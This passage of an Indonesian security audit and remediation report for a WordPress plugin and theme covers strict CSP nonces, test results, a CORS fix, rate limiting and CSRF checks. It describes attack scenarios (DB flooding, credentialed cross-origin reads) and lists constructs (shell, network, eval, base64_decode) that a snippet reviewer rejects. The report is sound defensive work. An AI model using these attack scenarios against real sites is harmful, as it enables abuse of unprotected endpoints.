- **`.htaccess` tidak cukup, dan itu ditulis di dalam berkasnya.** Mayoritas hosting Apache menghormati `.htaccess`, tetapi nginx mengabaikannya entirely. Ekuivalen nginx dicantumkan sebagai komentar di berkas yang sama dan di checklist verifikasi runbook (`curl` ke `vendor/composer/installed.json` harus **bukan** `200`).
- **Harness dipindah ke dalam repo karena yang di luar repo benar-benar hilang.** Suite P1 semula hidup di `/tmp` di luar repo; saat lingkungan kerja di-reset, seluruh harness itu lenyap dan harus ditulis ulang. Itu bukan hypothetical — itu yang terjadi selama pengerjaan P2, dan sekarang menjadi alasan `tests/` ada di dalam repo beserta CI-nya.
- **`tests/` tidak ikut terkirim ke pengguna akhir.** Direktori ini berada di root repo, bukan di dalam `plugins/layar-katalog-core/` atau `themes/layar-katalog/`, sehingga tidak tersalin saat tema/plugin dipasang ke `wp-content/`.

### Sisa pekerjaan setelah P2

Semuanya spesifik-situs — dan **empat dari lima butir di bawah sudah dikerjakan di P3** (lihat bagian *Remediasi P3*); yang tertinggal hanya menjalankannya di situs hidup:

1. **F-03 tahap 3** — lepas `'unsafe-inline'` dari `script-src` setelah semua kode iklan dimuat dari domain yang di-allowlist, lalu set `lkc_csp_mode` → `'enforce'`. Butuh data dari tab CSP di **Alat → Log Keamanan** pada situs hidup. Mode ketat tetap mengirim `style-src-attr 'unsafe-inline'` (lihat **F-18**); matikan lewat `add_filter( 'lkc_csp_strict_style_attributes', '__return_false' );` hanya setelah tab CSP bersih dari laporan `style-attribute` selama seminggu penuh.
2. **Job PHPCS** dibalik menjadi blocking setelah pelanggaran bawaan menyusut.
3. **Poin 18** — jalankan latihan restore kuartalan yang pertama dan isi lognya di `docs/BACKUP-RESTORE.md`.
4. **Poin 20** — uji aktivasi WordPress sungguhan, lintas browser, dan pengiriman push provider live di staging.
5. **Checklist operasional pra-live**: `WP_DEBUG`/`WP_DEBUG_DISPLAY` mati, `DISALLOW_FILE_EDIT` aktif, 2FA untuk semua akun admin, `debug.log` tidak terjangkau HTTP, dan filter `lkc_rate_limit_ip` dikonfigurasi bila berada di belakang CDN/proxy.

---

## Remediasi P3 — sudah diterapkan (2026-10-17)

Rilis: **Core Plugin 1.7.0 / Theme 1.7.0**. P3 bukan ronde temuan baru: ini ronde yang menutup empat pekerjaan yang di P2 ditandai "spesifik situs, tidak bisa diselesaikan dari dalam repo". Ternyata sebagian besar bisa — yang benar-benar butuh situs hidup hanya *menjalankan*-nya. Semua perubahan **opt-in**: situs yang tidak menyentuh apa pun berperilaku persis seperti 1.6.0.

| Item | Yang dikerjakan | Berkas |
|---|---|---|
| **F-03 tahap 3** — lepas `'unsafe-inline'` | Mode CSP ketat: `lkc_csp_strict` membuang `'unsafe-inline'` dan `'unsafe-eval'` dari `script-src`/`style-src`/`default-src` dan menggantinya dengan nonce per-request. Nonce distempel ke **setiap** `<script>`/`<style>` inline yang dicetak WordPress lewat `wp_script_attributes` + `wp_style_attributes`, jadi keluaran inline milik core (global styles, pengaturan emoji, data `wp_localize_script`) ikut tertutup tanpa plugin lain perlu tahu kebijakan ini ada. Diterapkan **setelah** filter pengguna, sehingga filter tidak bisa memasukkan `'unsafe-inline'` kembali | `includes/security.php:196-341` |
| **F-03 tahap 3** — kode iklan | Kode iklan administrator dicetak sebagai markup mentah, jadi tidak pernah melewati API skrip WordPress dan akan langsung diblokir kebijakan ketat. `layarkatalog_stamp_csp_nonce()` menambahkan nonce request ke tag `<script>`/`<style>` inline di dalamnya; loader eksternal dibiarkan | `themes/layar-katalog/functions.php:25-71, 158, 308, 663, 676` |
| **F-17** *(baru)* | `templates/front-page.html` memuat `style="flex-basis:58%"` dan `42%`. Atribut `style` inline **tidak bisa** membawa nonce dan hash tidak berlaku untuknya, sehingga ia penghalang terakhir `style-src` lepas dari `'unsafe-inline'`. Dipindah ke aturan `.wp-block-column.hero-copy` / `.hero-side` di `style.css`; tampilan tidak berubah (termasuk penumpukan di mobile yang dipaksa core dengan `!important`), dan editor blok ikut menampilkan rasio 58/42 yang sama karena tema sudah memuat stylesheet ini lewat `add_editor_style( 'style.css' )` | `templates/front-page.html:11,29`, `style.css:137-138` |
| **F-18** *(baru)* | Atribut `style` inline **tidak bisa** membawa nonce; yang bisa hanya `'unsafe-hashes'` + hash per nilai, dan nilainya dinamis. Melanjutkan F-17, ronde ini menutup dua sumber lagi di kode shipped: (a) `layarkatalog_ad_slot_shortcode()` mencetak `style="min-height:250px"` untuk menahan tinggi slot iklan — kini dipindah ke elemen `<style>` ber-nonce yang menarget `#lk-ad-slot-content-N`, dengan id per *keluaran* bukan per slot supaya satu slot yang dicetak dua kali di satu halaman tetap benar; (b) navigasi di `parts/header.html` memakai `"style":{"spacing":{"blockGap":…}}` yang dirender core menjadi atribut `style` — kini jadi kelas `layarkatalog-header-nav` dengan `gap` di `style.css`. Sisanya di luar kendali repo: blok inti (lebar kolom, overlay cover, filter duotone, dukungan spacing) dan page builder pihak ketiga. Karena itu mode ketat kini mengirim `style-src-attr 'unsafe-inline'` sebagai **satu-satunya** konsesi, dengan filter `lkc_csp_strict_style_attributes` untuk mematikannya. `script-src-attr` tidak dilonggarkan, jadi handler inline `onclick=` tetap terblokir; tanpa konsesi ini tata letak halaman akan hilang begitu `enforce` dinyalakan, dan itu terbaca sebagai "mode ketat merusak situs saya", bukan sebagai kebijakan. Sekaligus ditegaskan lewat uji: `lkc_send_security_headers()` berhenti di `is_admin()`, sehingga layar admin — yang masih memakai `onsubmit="return confirm(…)"` dan beberapa `style=` — tidak terkena kebijakan ini dan konfirmasi hapus log tidak ikut terblokir | `themes/layar-katalog/functions.php:687-708`, `parts/header.html:20`, `style.css:96-99`, `includes/security.php` (`lkc_apply_csp_strict_mode`, `lkc_csp_strict_allows_style_attributes`) |
| **Jalan ke `enforce`** | Tab CSP di **Alat → Log Keamanan** kini menyusun sendiri filter allowlist-nya dari laporan yang tersimpan: satu `add_filter( 'lkc_content_security_policy', … )` siap tempel, berisi host yang benar-benar terblokir beserta jumlah pelanggarannya. Host yang sudah diizinkan kebijakan (termasuk lewat `https:` pada `img-src`/`media-src`) dilewati, host situs sendiri dijelaskan sebagai pelanggaran inline, dan kata kunci `inline`/`eval`/`data` diterjemahkan menjadi tindakan yang benar-benar menyelesaikannya | `includes/audit.php:359-651, 939` |
| **Poin 20** — CI blocking | Job coding standards dibalik dari advisory menjadi **blocking**, tetapi hanya atas pelanggaran yang *dimasukkan* perubahan itu: PHPCS dijalankan pada revisi ini dan pada basisnya dengan ruleset yang sama, lalu dibandingkan. Pelanggaran dicocokkan berdasarkan nama sniff + pesan, bukan nomor baris, sehingga merapikan format sebuah berkas tidak membuat seluruh pelanggaran di bawah suntingan terlihat baru | `tests/phpcs-regression.mjs`, `.github/workflows/ci.yml` |
| **Poin 20** — uji aktivasi | `tests/wp/smoke-activate.sh`: verifikasi di staging yang tidak bisa dilakukan unit test — semua berkas PHP ter-*parse* oleh PHP server itu sendiri (regresi F-15), plugin/tema aktif, keempat tabel ada, migrasi `failure_count` sudah jalan, enam route REST terdaftar, tiga cron terjadwal, kunci VAPID berupa envelope yang masih bisa didekripsi salt berlaku, `vendor/` tidak terjangkau web, security header benar-benar tiba, rate limiter menulis `429`, dan `debug.log` tidak menyebut plugin ini | `tests/wp/smoke-activate.sh` |
| **Poin 18** — latihan restore | `tests/wp/rehearse-restore.sh`: dump → restore ke database sementara → verifikasi seluruh inventaris §1 → pemeriksaan salt §4.3 → cetak baris log untuk runbook. Tidak pernah menulis ke database produksi | `tests/wp/rehearse-restore.sh`, `docs/BACKUP-RESTORE.md` §6.1 |
| Guard untuk kedua skrip | `tests/wp/guards.test.sh` menjalankan 24 assertion atas penolakan keduanya dengan `wp` dan `mysql` palsu: restore ke database produksi, nama database berisi metakarakter shell, drop yang tidak dikonfirmasi dengan nama, dan deaktivasi plugin tanpa `--activate`. Setiap kasus memastikan **tidak ada satu pun perintah `mysql` yang dikeluarkan** | `tests/wp/guards.test.sh` |

### Bukti pengujian P3

| Suite | Assertion | Sebelum P3 | Sesudah P3 |
|---|---|---|---|
| `tests/php/security.test.php` | — | 152 | **254 lulus, 0 gagal** |
| `tests/js/phpcs-regression.test.js` | — | belum ada | **22 lulus, 0 gagal** |
| `tests/wp/guards.test.sh` | — | belum ada | **24 lulus, 0 gagal** |
| `tests/js/service-worker.test.js` | 18 | 18 lulus | **18 lulus** |
| `tests/js/player-dom-xss.test.js` | 22 | 22 lulus | **22 lulus** |
| `tests/lint-js.mjs` | per berkas | 15/15 | **17/17** |
| `tests/php/lint-phpwasm.mjs` | per berkas | 18/18 | **18/18** |

Assertion baru yang paling penting: **snippet yang dihasilkan tab CSP benar-benar di-`eval` oleh suite PHP**, lalu callback-nya dipanggil untuk memastikan ia menambahkan host yang tepat ke direktif yang tepat tanpa membuang sumber yang sudah ada. Snippet yang dihasilkan kode dan ditempel orang ke `mu-plugins` tidak boleh cuma *terlihat* benar.

### Catatan keputusan P3

- **Nonce, bukan hash.** Dua alasan, keduanya teknis. (1) WordPress core mencetak `<style id="global-styles-inline-css">` dan `<script id="…-js-extra">` dari `wp_localize_script` yang isinya bergantung theme.json dan status pengguna, sehingga tidak bisa dihitung pada `send_headers` — dan hash harus persis byte-per-byte. (2) Lebih berbahaya: menurut CSP2+, **kehadiran satu nonce atau hash membuat `'unsafe-inline'` diabaikan** browser. Menambahkan hash untuk CSS Customizer saja, sementara kode iklan masih inline, akan langsung merusak iklan tanpa ada yang menyalakan mode apa pun. Karena itu hash tidak dipakai sama sekali dan seluruh mekanisme digantung pada satu saklar.
- **Saklarnya opt-in, dan itu bukan kompromi.** Kebijakan ketat memblokir plugin pihak ketiga yang mencetak `<script>` mentah. Memaksakannya secara default berarti merusak situs orang lain atas nama keamanan mereka. Jalurnya: nyalakan `lkc_csp_strict` sambil tetap `report-only`, jelajahi situs, baca tab CSP, baru `enforce`.
- **Mode ketat menandai semua HTML sebagai terpersonalisasi.** Nonce berbeda tiap request, jadi HTML yang memuatnya tidak boleh disajikan cache kepada pengunjung berikutnya. Efek sampingnya service worker berhenti menyimpan HTML — trade-off yang benar, dan sengaja diuji (`X-LK-Personalized: 1`).
- **Generator snippet menolak menawarkan `inline`, `eval`, dan `data` sebagai domain.** Ketiganya masuk ke kolom `blocked_host` yang sama dengan URL, dan `$policy['script-src'][] = 'https://inline';` adalah baris yang tampak masuk akal sekaligus tidak berguna. `inline` diarahkan ke nonce, `eval` ke pencarian plugin yang memakainya (karena `'unsafe-eval'` membuka kembali lubang yang CSP tutup), dan `data` ke penambahan skema secara eksplisit bila memang perlu.
- **PHPCS blocking-atas-yang-baru, bukan blocking-atas-semua dan bukan advisory.** Blocking-atas-semua merah sejak hari pertama pada codebase yang mendahului ruleset-nya, dan check merah yang tidak bisa ditindaklanjuti akan diabaikan orang — itu justru alasan job ini advisory sejak awal. Advisory murni juga tidak menahan apa pun. Membandingkan dua laporan menahan semua kode baru tanpa mewariskan utang lama, dan bonusnya setiap pelanggaran yang diperbaiki ikut terhitung.
- **Skrip staging diuji pada pengamannya, bukan pada fungsinya.** Fungsinya butuh WordPress sungguhan; yang berbahaya adalah kemungkinan ia disalahartikan lalu menghapus database produksi. Karena itu yang di-CI-kan adalah penolakannya, dengan assertion bahwa tidak ada perintah `mysql` yang keluar.
- **Atribut `style=` dipindah ke CSS, bukan diakali `'unsafe-hashes'`.** `'unsafe-hashes'` memang bisa mengizinkan atribut gaya per-hash, tetapi dukungannya baru merata di 2023 dan ia menambah satu direktif lagi yang harus dirawat. Dua aturan CSS menyelesaikan masalahnya permanen dengan hasil render yang identik.

### Sisa pekerjaan setelah P3

Tidak ada lagi yang bisa dikerjakan dari dalam repo. Yang tertinggal murni eksekusi di situs hidup:

1. Jalankan `tests/wp/smoke-activate.sh` di staging (dengan `--activate` untuk menguji siklus aktivasi penuh), lalu `tests/wp/smoke-activate.sh` lagi setelah deploy produksi pertama.
2. Pra-uji dulu dengan `node tests/js/csp-audit.mjs --url=https://staging.example/ --strict` (lihat bagian *Persiapan eksekusi situs-hidup*), lalu nyalakan `lkc_csp_strict` sambil tetap `report-only` selama seminggu penjelajahan normal → buka **Alat → Log Keamanan → CSP** → tempel snippet yang dihasilkan ke `wp-content/mu-plugins/` → periksa tiap baris → jalankan auditor sekali lagi untuk memastikan tidak ada yang tersisa → periksa berkas mu-plugin itu dengan `node tests/csp-snippet-review.mjs wp-content/mu-plugins/<berkas>.php` (harus berakhir `SAFE TO PASTE`) → set `lkc_csp_mode` ke `'enforce'` → matikan `lkc_csp_strict` bila ada plugin pihak ketiga yang ternyata mencetak skrip mentah.
3. Jalankan latihan restore pertama dengan `tests/wp/rehearse-restore.sh`, isi baris lognya di `docs/BACKUP-RESTORE.md` §6, dan tutup temuan apa pun sebelum latihan berikutnya.
4. Uji lintas browser (Chrome, Firefox, Safari) dan pengiriman push nyata dari provider, karena keduanya tidak bisa disimulasikan harness.
5. Checklist operasional pra-live: `WP_DEBUG_DISPLAY` mati, `DISALLOW_FILE_EDIT` aktif, 2FA semua admin, `debug.log` tidak terjangkau HTTP, `lkc_rate_limit_ip` dikonfigurasi di belakang CDN, dan `includeSubDomains` dilepas dari HSTS bila ada layanan non-HTTPS di subdomain.

---
## Persiapan eksekusi situs-hidup — sudah diterapkan (2026-10-17)

Ronde ini tidak mengubah satu baris pun kode yang di-*ship*, jadi **tidak ada bump versi**: tetap Core Plugin 1.7.0 / Theme 1.7.0. Yang ditambah adalah dua alat supaya lima langkah di atas bisa dikerjakan dengan bukti, bukan perkiraan — keduanya diuji, keduanya masuk CI.

| Item | Yang dikerjakan | Berkas |
|---|---|---|
| **Poin 20** — logika aktivasi | Suite baru `tests/php/activation.test.php` (81 assertion) menguji *apa yang didaftarkan* aktivasi, bukan hanya bahwa ia tidak fatal: argumen kedua post type dan taksonomi, 24 kunci meta katalog beserta `show_in_rest`/`sanitize_callback`/`auth_callback`/`single` (regresi F-15), keenam route `lkc/v1` dengan `permission_callback` dan `methods`-nya, pemisahan hak route rating (GET publik, POST lewat `lkc_rest_can_rate_title` — penjaga IDOR poin 14), `args` wajib `/push/subscribe`, tiga `sanitize_callback` route pencarian, keempat panggilan `dbDelta`, cron yang dijadwalkan, dan registrasi aset front-end (URL asal plugin, cache-buster `filemtime`, footer, tidak ada `http://`) | `tests/php/activation.test.php` |
| Pemindai integritas callback | Bagian pertama suite itu memindai keenam berkas registrasi yang di-*ship* dan menuntut setiap `add_action`, `add_filter`, `add_shortcode`, `register_activation_hook`, serta setiap kunci `callback`/`permission_callback`/`sanitize_callback`/`validate_callback` menunjuk fungsi yang benar-benar ada. Ini kelas cacat yang tidak terlihat oleh `php -l` dan yang baru meledak pada request pertama yang memicu hook-nya — dan ia diuji dulu terhadap fixture sintetis, supaya pemindainya sendiri tidak bisa lulus diam-diam | `tests/php/activation.test.php` |
| **F-03** — pra-uji sebelum `enforce` | `tests/js/csp-audit.mjs`: auditor CSP statis. Menerima `--url=` (membaca header CSP yang benar-benar dikirim situs), `--html=`, atau markup dari stdin, lalu melaporkan sumber daya mana yang akan diblokir kebijakan itu dengan semantik browser yang benar: rantai fallback `-elem`/`-attr` → induk → `default-src`, wildcard host, port default, `'self'`, sumber skema, dan jebakan CSP2 bahwa satu nonce membuat `'unsafe-inline'` diabaikan. `--strict` mengevaluasi seolah `lkc_csp_strict` sudah nyala. Keluarannya menyebut nomor baris, mengelompokkan host per direktif, mencetak hash untuk inline yang tidak bisa di-nonce, dan menyusun snippet `add_filter( 'lkc_content_security_policy', … )` yang bentuknya sama dengan hasil tab CSP. Exit 1 bila ada yang akan terblokir, jadi bisa menahan deploy | `tests/js/csp-audit.mjs`, `tests/js/csp-audit.test.js` (59 assertion), `tests/js/fixtures/csp-sample.html` |
| **F-03** — snippet yang akan ditempel | `tests/csp-snippet-review.mjs`: langkah 3 meminta orang menempel PHP hasil generator ke `wp-content/mu-plugins/` lalu "memeriksa tiap baris". Alat ini memeriksa dengan *menjalankannya* — satu boot PHP 8.2 WebAssembly memuat `security.php` milik plugin, menerapkan snippet lewat filter yang benar-benar dipakai plugin, lalu mencetak header yang akan dikirim situs beserta sumber yang bertambah dan yang hilang per direktif. Yang ditolak outright: filter pada tag yang salah (typo yang membuat snippet tidak pernah jalan sementara operator mengira allowlist-nya sudah terpasang), `return $policy;` yang hilang (kebijakan runtuh dari 13 direktif menjadi 0, situs **tidak mengirim CSP sama sekali**), kata kunci tanpa kutip (`array( 'self', '*' )` mengirim `style-src self *`), sumber wildcard, dan apa pun yang bertahan setelah `lkc_csp_strict` dinyalakan — filter pada `lkc_csp_directives` berjalan *sesudah* mode ketat, jadi ia bisa memasukkan `'unsafe-inline'` kembali di belakang nonce. Konstruk yang tidak punya alasan ada di snippet kebijakan (filesystem, jaringan, shell, `eval`, `include`, `base64_decode`, superglobal, `$wpdb`, `ini_set`, `extract`, refleksi) ikut ditolak. Delapan fixture mencakup satu kasus masing-masing, disimpan sebagai `.php.txt` supaya job `php -l` di CI tidak ikut me-*lint* fixture yang sengaja rusak | `tests/csp-snippet-review.mjs`, `tests/js/csp-snippet-review.test.js` (105 assertion), `tests/js/fixtures/snippets/` |
| Kedua skrip staging akhirnya *dijalankan* | `tests/wp/simulated-install.test.sh` (118 assertion) menjalankan `smoke-activate.sh` dan `rehearse-restore.sh` dari awal sampai akhir terhadap WordPress yang tidak ada: `wp`, `mysql`, `curl`, dan `php -l` palsu menjawab setiap panggilan mereka dari variabel `SIM_*` dengan default sehat, lalu setiap kasus merusak **satu** hal dan menuntut pemeriksaan yang tepat yang disalahkan — tabel hilang, cron tidak terjadwal, route tidak terdaftar, kunci VAPID plaintext atau yatim karena salt dirotasi, header CSP/HSTS hilang, `vendor/` terjangkau, rate limiter yang tidak pernah menjawab 429 atau baru menjawab di permintaan ke-13, plugin/tema tidak aktif, `index.php` di root tema blok, berkas yang tidak ter-*parse*, fatal saat siklus aktivasi, notice di `debug.log`, restore yang tidak lengkap, salt cadangan yang berbeda atau kurang dari 8. Sekaligus membuktikan drill tidak pernah mengarahkan `mysql` ke database live, selalu lewat berkas kredensial 0600, dan menghormati `--activate`/`--skip-http`/`--skip-rate-limit`/`--verify-only`/`--keep`/`--keep-dump`. Sebelumnya kedua skrip itu hanya pernah *dibaca* | `tests/wp/simulated-install.test.sh` |
| Header ketat dan markup tema akhirnya diadu satu sama lain | `tests/php/csp-strict.test.php` menyalakan `lkc_csp_strict` di sandbox WebAssembly lalu mencetak dua hal: header yang **benar-benar** dikirim plugin, dan dokumen yang disusun dari markup yang **benar-benar** dicetak tema — slot iklan dengan `<style>` ber-nonce, loader iklan administrator (satu eksternal, satu inline), stylesheet dan skrip same-origin, gambar `https:`, video same-origin — plus dua kontrol negatif: atribut `style` ala page builder dan handler `onclick=`. `tests/js/csp-strict-roundtrip.test.js` mengurai dokumen itu dengan jsdom dan menilainya dengan matcher CSP dari `csp-audit.mjs` terhadap empat varian header (default report-only, ketat, ketat + snippet allowlist, ketat tanpa konsesi). Hasilnya: semua markup shipped lolos; loader iklan eksternal terblokir sampai snippet di-tempel — persis alur minggu report-only; handler inline terblokir di mode ketat tetapi **masih jalan** di header default; atribut `style` lolos hanya karena konsesi, dan langsung terblokir begitu konsesi dimatikan | `tests/php/csp-strict.test.php`, `tests/js/csp-strict-roundtrip.test.js` |
| Runner + bootstrap | `run-phpwasm.mjs` kini bisa menjalankan berkas uji apa pun di bawah `tests/` (path divalidasi, `..` ditolak), dan `bootstrap.php` diperluas: `WP_REST_Server` dengan konstanta method-nya, `register_meta`, `flush_rewrite_rules`, `plugins_url`, `_x`, `sanitize_title`, `__return_true`/`__return_false`. Stub yang tadinya diam kini merekam argumennya (`register_taxonomy`, `wp_register_script`/`wp_register_style`, `wp_enqueue_*`, `dbDelta`) supaya suite aktivasi bisa memeriksa *nilai* yang dikirim, bukan hanya bahwa fungsinya dipanggil. Stand-in `wp-admin/includes/upgrade.php` dibuat otomatis karena kedua installer `require_once` berkas itu. Suite keamanan lama tetap **254 lulus, 0 gagal** sesudah semua perubahan ini | `tests/php/run-phpwasm.mjs`, `tests/php/bootstrap.php` |

### Bukti pengujian

| Suite | Assertion | Hasil |
|---|---|---|
| `tests/php/activation.test.php` | 81 | **81 lulus, 0 gagal** *(baru)* |
| `tests/js/csp-audit.test.js` | 59 | **59 lulus, 0 gagal** *(baru)* |
| `tests/js/csp-snippet-review.test.js` | 105 | **105 lulus, 0 gagal** *(baru)* |
| `tests/wp/simulated-install.test.sh` | 118 | **118 lulus, 0 gagal** *(baru)* |
| `tests/php/csp-strict.test.php` | 45 | **45 lulus, 0 gagal** *(baru)* |
| `tests/js/csp-strict-roundtrip.test.js` | 20 | **20 lulus, 0 gagal** *(baru)* |
| `tests/php/security.test.php` | 254 | 254 lulus, 0 gagal |
| `tests/js/service-worker.test.js` | 18 | 18 lulus, 0 gagal |
| `tests/js/player-dom-xss.test.js` | 22 | 22 lulus, 0 gagal |
| `tests/js/phpcs-regression.test.js` | 22 | 22 lulus, 0 gagal |
| `tests/wp/guards.test.sh` | 24 | 24 lulus, 0 gagal |
| `tests/lint-js.mjs` | per berkas | 21/21 |
| `tests/php/lint-phpwasm.mjs` | per berkas | 18/18 |

Keenam suite baru masuk CI (dijalankan dari dalam `tests/`) dan `.github/workflows/ci.yml`: suite aktivasi dijalankan job `php` dengan PHP 8.2 asli, auditor CSP dijalankan job `javascript` sebelum instalasi dependensi karena ia hanya memakai bawaan Node, pemeriksa snippet dijalankan sesudah instalasi karena ia membutuhkan runtime WebAssembly, simulasi instalasi dijalankan job `php` tepat setelah guard skrip staging, dan round trip mode ketat dijalankan job `javascript` sesudah pemeriksa snippet karena ia membutuhkan runtime WebAssembly dan jsdom sekaligus.

### Cara auditor ini mengubah langkah 2 dan 3

Sebelumnya satu-satunya cara mengetahui apa yang akan diblokir `enforce` adalah menyalakan mode ketat di situs hidup, menjelajah seminggu, lalu membaca tab CSP. Itu tetap jalur yang benar: laporan browser adalah otoritas, dan hanya browser yang melihat apa yang disuntikkan skrip pihak ketiga saat runtime. Auditor ini tidak menggantikannya — ia memangkas risiko di kedua ujungnya.

```bash
# sebelum menyalakan apa pun: apa yang akan hilang dari halaman ini?
node tests/js/csp-audit.mjs --url=https://staging.example/ --strict

# sesudah snippet dari tab CSP dipasang: masih ada yang terblokir?
node tests/js/csp-audit.mjs --url=https://staging.example/ --strict --quiet

# uji kebijakan yang sedang dipertimbangkan, tanpa menyentuh situs
node tests/js/csp-audit.mjs --html=page.html --document-url=https://staging.example/ \
    --policy="default-src 'self'; script-src 'self' https://pagead2.googlesyndication.com"
```

Dua hal yang ditegaskan auditor ini, yang sebelumnya hanya hidup sebagai catatan keputusan:

- **Atribut tidak bisa di-nonce.** `style="…"` dan `onclick="…"` tetap diblokir kebijakan ketat walaupun nonce-nya cocok, karena browser mengabaikan nonce pada atribut. Itu alasan F-17 memindah gaya inline ke stylesheet, dan alasan laporan auditor menyebut `addEventListener` — bukan nonce — sebagai perbaikan untuk handler. Jalan keluarnya (`'unsafe-hashes'` + hash) ikut dicetak, bersama peringatan bahwa ia melemahkan kebijakan.
- **Satu nonce mematikan `'unsafe-inline'` untuk seluruh direktif.** Auditor mereproduksi aturan CSP2 itu, sehingga halaman yang hari ini terasa aman justru karena `'unsafe-inline'` langsung terlihat rapuhnya begitu mode ketat dinyalakan — sebelum ada pengunjung yang melihat halaman rusak.

### Yang tetap tidak bisa dikerjakan dari repo

Batasnya perlu dikatakan terus terang: **mode ketat belum pernah diamati di browser sungguhan** — yang kini teruji adalah bahwa header yang di-emit sumber shipped mengizinkan markup yang di-emit sumber shipped (round trip 45 + 20 assertion, lewat parser jsdom dan matcher CSP auditor). Yang tetap tidak terlihat dari repo ini: markup yang dicetak plugin pihak ketiga dan blok inti di luar tema, perilaku cache atau proxy di depan situs, dan apakah ada browser yang menolak sesuatu yang matcher izinkan. Kedua skrip `tests/wp/` juga **belum pernah dijalankan terhadap instalasi WordPress nyata** — logika keduanya kini terbukti lewat `simulated-install.test.sh` (118 assertion, `wp`/`mysql`/`curl`/`php` palsu), tetapi stub itu mengkodekan *asumsi* tentang keluaran WP-CLI dan MySQL, jadi yang terbukti adalah bahwa skripnya benar, bukan bahwa situs Anda sehat. Suite aktivasi memeriksa argumen registrasi pada sumber yang di-*ship*, bukan hasilnya di database nyata — itu tugas `smoke-activate.sh` di staging. Kelima langkah di atas tetap milik operator.

---
## Detail per poin

### 1. Rate limit API — ❌ GAGAL

Semua route kustom bisa dipanggil tanpa batas oleh pengunjung anonim:

| Route | Auth | Bukti |
|---|---|---|
| `GET /wp-json/lkc/v1/catalog/search` | publik | `layar-katalog-core.php:2106-2161` |
| `GET /wp-json/lkc/v1/ratings/{id}` | publik | `includes/engagement.php:140-148` |
| `POST /wp-json/lkc/v1/ratings/{id}` | login + `read` | `includes/engagement.php:149-153` |
| `GET /wp-json/lkc/v1/push/key` | publik | `includes/web-push.php:224-232` |
| `POST /wp-json/lkc/v1/push/subscribe` | **publik, tanpa nonce** | `includes/web-push.php:233-241` |
| `POST /wp-json/lkc/v1/push/unsubscribe` | **publik, tanpa nonce** | `includes/web-push.php:242-251` |

WordPress core **tidak** menyediakan rate limiting untuk REST API. Dampak nyata:

- `POST /push/subscribe` anonim → attacker bisa menulis **baris tak terbatas** ke `wp_lkc_push_subscriptions` (DB flooding, disk penuh). Setiap baris juga **dikirimi push** tiap episode baru → amplifikasi biaya/kron dan reputasi IP di mata push service.
- `GET /catalog/search` memakai `meta_query` + `tax_query` + `WP_Query` dengan `no_found_rows => false` → query mahal; mudah dipakai untuk CPU/DB exhaustion. `Cache-Control: public, max-age=60` (`layar-katalog-core.php:2265`) hanya membantu jika ada reverse proxy di depan.

> **Status: ✅ diperbaiki di Core Plugin 1.4.1** — lihat bagian *Remediasi P0*. Ringkasan: filter `rest_pre_dispatch` membatasi semua route `/lkc/v1` (default 60 baca + 10 tulis per menit per pengunjung, `429` + `Retry-After`), dan jumlah langganan push dibatasi 5000. Rekomendasi asli dipertahankan di bawah.

**Rekomendasi:**
1. Throttle berbasis transien per IP + per user untuk semua route `lkc/v1` (mis. 20 req/menit baca, 5 req/menit tulis), return `429` + `Retry-After`.
2. Batas keras jumlah langganan (mis. `MAX_SUBSCRIPTIONS = 5000`) + batas per IP (mis. 5 subscription aktif/IP/hari).
3. Cron pembersih langganan basi (tidak pernah dipakai > 90 hari) — saat ini baris hanya dihapus saat push service melaporkan expired (`includes/web-push.php:449-451`).
4. Di level server: rate limit `wp-json/lkc/v1/*` via Nginx `limit_req` / Cloudflare WAF.

---

### 2. CORS ketat — ⚠️ SEBAGIAN (mengikuti default WP yang longgar)

> **Status: ✅ diperbaiki di Core Plugin 1.5.0** — lihat bagian *Remediasi P1*. Ringkasan: header CORS yang dipantulkan core diganti allowlist. Origin permintaan dinormalisasi (`lkc_normalize_origin`) lalu dibandingkan terhadap `lkc_allowed_cors_origins` (default: origin situs sendiri). Origin tak dikenal **kehilangan seluruh** header `Access-Control-Allow-*`, sehingga JavaScript lintas situs tidak bisa membaca respons yang membawa cookie; `Vary: Origin` selalu dikirim agar cache bersama tidak menukar header antar-origin. Dipasang di `rest_pre_serve_request` **dan** `rest_post_dispatch`. Teruji 10 assertion, termasuk serangan sufiks (`notexample.test`), prefiks (`example.test.evil.test`), dan penurunan skema.

Tidak ada satu pun hook `rest_pre_serve_request`, `rest_send_cors_headers`, atau header `Access-Control-Allow-*` di kode proyek (dikonfirmasi dengan grep — hanya ada `Cache-Control` di `engagement.php:177` dan `layar-katalog-core.php:2265`).

Artinya proyek mewarisi perilaku core `rest_send_cors_headers()`: **Origin apa pun dipantulkan** sebagai `Access-Control-Allow-Origin` **bersama** `Access-Control-Allow-Credentials: true`.

Dampak: situs jahat mana pun bisa melakukan request **berkredensial** (cookie) lintas-origin ke `GET /lkc/v1/ratings/{id}` dan **membaca responsnya** → membocorkan `my_rating` (data per-user) pengunjung yang sedang login ke pihak ketiga. Ini kebocoran rendah-sensitivitas, tapi persis pola yang diminta untuk dicegah.

Sisi baik: **tulis** tetap aman, karena auth cookie REST butuh nonce `wp_rest` yang tidak bisa dibaca lintas origin (front-end HTML tidak mengirim header CORS).

**Rekomendasi:** pasang filter yang menghapus/mengganti header CORS untuk namespace `lkc/v1` — hanya izinkan same-origin (atau allowlist domain eksplisit), dan jangan pernah kombinasikan `Allow-Origin: *` dengan `Allow-Credentials: true`:

```php
add_filter( 'rest_pre_serve_request', function ( $result, $server, $request ) {
    if ( str_starts_with( $request->get_route(), '/lkc/v1' ) ) {
        header_remove( 'Access-Control-Allow-Origin' );
        header_remove( 'Access-Control-Allow-Credentials' );
        header( 'Vary: Origin' );
    }
    return $result;
}, 10, 3 );
```

---

### 3. CSRF protection — ✅ LULUS (dengan 1 catatan)

| Aksi | Proteksi | Bukti |
|---|---|---|
| Simpan pengaturan push | `current_user_can('manage_options')` + `check_admin_referer('lkc_save_push_settings')` | `web-push.php:53-56` |
| Generate/rotasi kunci VAPID | `manage_options` + `check_admin_referer('lkc_generate_vapid_keys')` | `web-push.php:88-91` |
| Hapus semua langganan | `manage_options` + `check_admin_referer('lkc_clear_push_subscriptions')` | `web-push.php:117-120` |
| Simpan metabox episode/katalog | `wp_verify_nonce(..., 'lkc_save_meta')` + `DOING_AUTOSAVE` + `current_user_can('edit_post')` | `layar-katalog-core.php:667-676` |
| Halaman admin (render) | `wp_die()` bila tanpa `manage_options` | `web-push.php:129-131`, `themes/.../functions.php:526-528` |
| `POST /ratings/{id}` | cookie auth REST → **wajib** nonce; JS mengirim `X-WP-Nonce` | `engagement.php:316`, `assets/engagement.js:262` |
